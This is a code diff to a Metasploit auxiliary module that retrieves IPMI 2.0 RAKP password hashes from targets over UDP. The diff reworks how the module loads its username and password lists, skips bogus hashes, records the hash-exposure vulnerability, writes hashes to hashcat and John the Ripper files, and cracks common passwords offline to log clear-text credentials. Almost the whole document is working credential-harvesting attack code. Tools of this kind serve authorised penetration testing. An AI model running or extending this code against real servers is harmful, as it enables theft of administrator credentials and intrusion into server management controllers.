@@ -52,31 +52,34 @@ class Metasploit3 < Msf::Auxiliary
 
 		vprint_status("Sending IPMI probes to #{ip}")
 
+		usernames = []
+		passwords = []
+
+		# Load up our username list (save on open fds)
+		::File.open(datastore['USER_FILE'], "rb") do |fd|
+			fd.each_line do |line|
+				usernames << line.strip
+			end
+		end
+		usernames << ""
+		usernames = usernames.uniq
+
+		# Load up our password list (save on open fds)
+		::File.open(datastore['PASS_FILE'], "rb") do |fd|
+			fd.each_line do |line|
+				passwords << line.gsub(/\r?\n?/, '')
+			end
+		end
+		passwords << ""
+		passwords = passwords.uniq
+
+
 		self.udp_sock = Rex::Socket::Udp.create({'Context' => {'Msf' => framework, 'MsfExploit' => self}})
 		add_socket(self.udp_sock)
-		udp_send(Rex::Proto::IPMI::Utils.create_ipmi_getchannel_probe)
-		r = udp_recv(5.0)
 
-		unless r
-			vprint_status("#{rhost} No response to IPMI probe")
-			return
-		end
+		reported_vuln = false
 
-		info = process_getchannel_reply(*r)
-		unless info
-			vprint_status("#{rhost} Could not understand the response to the IPMI probe")
-			return
-		end
-
-		unless info.ipmi_compat_20 == 1
-			vprint_status("#{rhost} Does not support IPMI 2.0")
-			return
-		end
-
-		fd = ::File.open(datastore['USER_FILE'], "rb")
-		fd.each_line do |line|
-			username = line.strip
-
+		usernames.each do |username|
 			console_session_id = Rex::Text.rand_text(4)
 			console_random_id  = Rex::Text.rand_text(16)
 
@@ -168,16 +171,15 @@ class Metasploit3 < Msf::Auxiliary
 			sha1_salt = hmac_buffer.unpack("H*")[0]
 			sha1_hash = rakp.hmac_sha1.unpack("H*")[0]
 
+			if sha1_hash == "\x00" * 20
+				vprint_error("#{rhost} Returned a bogus SHA1 hash for username #{username}")
+				next
+			end
+
 			found = "#{rhost} #{username}:#{sha1_salt}:#{sha1_hash}"
 			print_good(found)
 
-			# Write the rakp hash to the output files
-			if @output_cat
-				@output_cat.write("#{rhost} #{username}:#{sha1_salt}:#{sha1_hash}\n")
-			end
-			if @output_jtr
-				@output_jtr.write("#{rhost} #{username}:$rakp$#{sha1_salt}$#{sha1_hash}\n")
-			end
+			write_output_files(rhost, username, sha1_salt, sha1_hash)
 
 			# Write the rakp hash to the database
 			report_auth_info(
@@ -192,62 +194,44 @@ class Metasploit3 < Msf::Auxiliary
 				:type   => 'rakp_hmac_sha1_hash'
 			)
 
+			# Write the vulnerability to the database
+			unless reported_vuln
+				report_vuln(
+					:host  => rhost,
+					:port  => rport,
+					:proto => 'udp',
+					:sname => 'ipmi',
+					:name  => 'IPMI 2.0 RMCP+ Authentication Password Hash Exposure',
+					:info  => "Obtained password hash for user #{username}: #{sha1_salt}:#{sha1_hash}",
+					:refs  => self.references
+				)
+				reported_vuln = true
+			end
+
 			# Offline crack common passwords and report clear-text credentials
 			next unless datastore['CRACK_COMMON']
 
-			::File.open(datastore['PASS_FILE'], "rb") do |pfd|
-				passwords = pfd.read(pfd.stat.size).split("\n")
-				passwords << ""
-				passwords.uniq.each do |pass|
-					pass = pass.strip
-					next unless pass.length > 0
-					next unless Rex::Proto::IPMI::Utils.verify_rakp_hmac_sha1(hmac_buffer, rakp.hmac_sha1, pass)
-					print_good("#{rhost} Hash for user '#{username}' matches password '#{pass}'")
+			passwords.uniq.each do |pass|
+				pass = pass.strip
+				next unless pass.length > 0
+				next unless Rex::Proto::IPMI::Utils.verify_rakp_hmac_sha1(hmac_buffer, rakp.hmac_sha1, pass)
+				print_good("#{rhost} Hash for user '#{username}' matches password '#{pass}'")
 
-					# Report the clear-text credential to the database
-					report_auth_info(
-						:host	=> rhost,
-						:port   => rport,
-						:proto  => 'udp',
-						:sname	=> 'ipmi',
-						:user 	=> username,
-						:pass   => pass,
-						:source_type => "cracked",
-						:active => true,
-						:type   => 'password'
-					)
-					break
-				end
+				# Report the clear-text credential to the database
+				report_auth_info(
+					:host	=> rhost,
+					:port   => rport,
+					:proto  => 'udp',
+					:sname	=> 'ipmi',
+					:user 	=> username,
+					:pass   => pass,
+					:source_type => "cracked",
+					:active => true,
+					:type   => 'password'
+				)
+				break
 			end
 		end
-	end
-
-	def process_getchannel_reply(data, shost, sport)
-		shost = shost.sub(/^::ffff:/, '')
-		info = Rex::Proto::IPMI::Channel_Auth_Reply.new(data) rescue nil
-
-		# Ignore invalid responses
-		return if not info
-		return if not info.ipmi_command == 56
-
-		banner = info.to_banner
-
-		print_status("#{shost} #{banner}")
-
-		report_service(
-			:host  => rhost,
-			:port  => rport,
-			:proto => 'udp',
-			:name  => 'ipmi',
-			:info  => banner
-		)
-
-		# TODO:
-		# Report a vulnerablity if info.ipmi_user_anonymous has been set
-		# Report a vulnerability if ipmi 2.0 and kg is set to default
-		# Report a vulnerability if info.ipmi_user_null has been set (null username)
-
-		info
 	end
 
 	def process_opensession_reply(data, shost, sport)
@@ -266,24 +250,21 @@ class Metasploit3 < Msf::Auxiliary
 		info
 	end
 
-	def setup
-		super
-		@output_cat = nil
-		@output_jtr = nil
-		if datastore['OUTPUT_HASHCAT_FILE']
-			@output_cat = ::File.open(datastore['OUTPUT_HASHCAT_FILE'], "ab")
-		end
-		if datastore['OUTPUT_JOHN_FILE']
-			@output_jtr = ::File.open(datastore['OUTPUT_JOHN_FILE'], "ab")
-		end
-	end
 
-	def cleanup
-		super
-		@output_cat.close if @output_cat
-		@output_cat = nil
-		@output_jtr.close if @output_jtr
-		@output_jtr = nil
+	def write_output_files(rhost, username, sha1_salt, sha1_hash)
+		if datastore['OUTPUT_HASHCAT_FILE']
+			::File.open(datastore['OUTPUT_HASHCAT_FILE'], "ab") do |fd|
+				fd.write("#{rhost} #{username}:#{sha1_salt}:#{sha1_hash}\n")
+				fd.flush
+			end
+		end
+
+		if datastore['OUTPUT_JOHN_FILE']
+			::File.open(datastore['OUTPUT_JOHN_FILE'], "ab") do |fd|
+				fd.write("#{rhost} #{username}:$rakp$#{sha1_salt}$#{sha1_hash}\n")
+				fd.flush
+			end
+		end
 	end
 
 	#
